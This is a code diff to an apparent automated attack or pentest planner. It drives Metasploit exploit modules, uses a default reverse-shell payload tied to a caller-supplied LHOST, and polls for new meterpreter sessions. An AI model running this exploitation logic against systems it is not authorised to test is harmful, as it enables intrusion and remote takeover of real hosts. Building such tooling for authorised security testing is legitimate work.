@@ -461,21 +461,49 @@ class Planner:
 
         module_path = args.get("module", "")
         options     = args.get("options", {})
+        wait_s      = int(args.get("wait_s", 30))
+        poll_s      = float(args.get("poll_s", 2))
 
         try:
+            if not module_path:
+                return "msf_exploit skipped — missing required 'module' path"
+
             exploit = self._msf.modules.use("exploit", module_path)
             for k, v in options.items():
                 exploit[k] = v
-            exploit["LHOST"] = options.get("LHOST", "")
+
+            # Do not force-clear LHOST. If the module/payload needs it,
+            # the caller must provide a real routable value.
+            if options.get("LHOST"):
+                exploit["LHOST"] = options["LHOST"]
 
             payload = self._msf.modules.use(
                 "payload",
                 args.get("payload", "generic/shell_reverse_tcp"),
             )
+            existing_sessions = set(self._msf.sessions.list.keys())
             result = exploit.execute(payload=payload)
 
-            # Check if a new session appeared
-            sessions = list(self._msf.sessions.list.keys())
+            # Poll briefly for a new session so async exploit jobs don't look "silent".
+            elapsed = 0.0
+            while elapsed < wait_s:
+                sessions_now = set(self._msf.sessions.list.keys())
+                new_sessions = sorted(sessions_now - existing_sessions)
+                if new_sessions:
+                    sess_list = [
+                        {"id": sid, "type": "meterpreter"}
+                        for sid in sorted(sessions_now)
+                    ]
+                    self._state.update(sessions=sess_list)
+                    return (
+                        f"Exploit succeeded — new session(s): {new_sessions}. "
+                        f"All active sessions: {sorted(sessions_now)}"
+                    )
+                time.sleep(max(poll_s, 0.5))
+                elapsed += max(poll_s, 0.5)
+
+            # No new session appeared in wait window.
+            sessions = sorted(self._msf.sessions.list.keys())
             if sessions:
                 sess_list = [
                     {"id": sid, "type": "meterpreter"}
@@ -483,11 +511,14 @@ class Planner:
                 ]
                 self._state.update(sessions=sess_list)
                 return (
-                    f"Exploit succeeded — {len(sessions)} session(s) opened: "
-                    f"{sessions}"
+                    f"Exploit finished with existing session(s): {sessions}. "
+                    "No new session detected in wait window."
                 )
 
-            return f"Exploit ran but no session opened. Result: {result}"
+            return (
+                f"Exploit ran but no session opened after {wait_s}s wait. "
+                f"Result: {result}"
+            )
 
         except Exception as e:
             self._state.log_error("msf_exploit", str(e))
